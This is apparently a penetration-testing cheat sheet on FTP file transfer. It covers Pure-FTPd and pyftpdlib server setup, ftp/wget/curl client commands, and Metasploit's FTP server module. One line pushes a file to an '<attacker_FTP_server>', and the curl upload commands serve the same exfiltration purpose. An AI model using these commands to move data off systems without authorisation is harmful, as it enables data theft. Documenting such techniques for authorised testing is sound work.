# FTP

## 01 - Unix Shell

### 1.1 - Setup

#### 1.1.1 - Pure-FTPd

`$ sudo apt install pure-ftpd`

`$ cat setup-pure-ftpd.sh`

---

```bash
#!/bin/sh
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd <username> -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```

```
$ chmod +x setup-pure-ftpd.sh

$ sudo ./setup-pure-ftpd.sh
```

#### 1.1.2 - PyFTPdlib

`$ sudo apt install python-pyftpdlib`

`$ python3 -m pyftpdlib -p <PORT>`

### 1.2 - Usage

#### 1.2.1 - Download

```
$ ftp <attacker_FTP_server>

ftp> put file.txt

$ wget -m ftp://<username>@<password>@<IP>

$ wget -m --no-passive ftp://<username>@<password>@<IP>

$ curl -u <username>:<password> ftp://<IP>/file.txt
```

#### 1.2.2 - Upload

`$ curl -u <username>:<password> -T /path/to/file.txt ftp://<IP>`

## 02 - Metasploit

```
msf > use auxiliary/server/ftp

msf auxiliary(server/ftp) > options

Module options (auxiliary/server/ftp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FTPPASS                    no        Configure a specific password that should be allowed access
   FTPROOT   /tmp/ftproot     yes       The FTP root directory to serve files from
   FTPUSER                    no        Configure a specific username that should be allowed access
   PASVPORT  0                no        The local PASV data port to listen on (0 is random)
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   21               yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)


Auxiliary action:

   Name     Description
   ----     -----------
   Service  Serve files via FTP


msf auxiliary(server/ftp) > set ftproot /path/to/host/files

msf auxiliary(server/ftp) > set ftpuser <username>

msf auxiliary(server/ftp) > set ftppass <password>

msf auxiliary(server/ftp) > run
```

## References

- [Hacktricks Pentesting FTP Bounce Attack](https://book.hacktricks.xyz/pentesting/pentesting-ftp/ftp-bounce-attack)

- [Hacktricks Pentesting FTP Download 2OFTP File]https://book.hacktricks.xyz/pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file

- [How to Use FTP Under Linux to Transfer Files](https://www.thegeekdiary.com/how-to-use-ftp-under-linux-to-transfer-files/)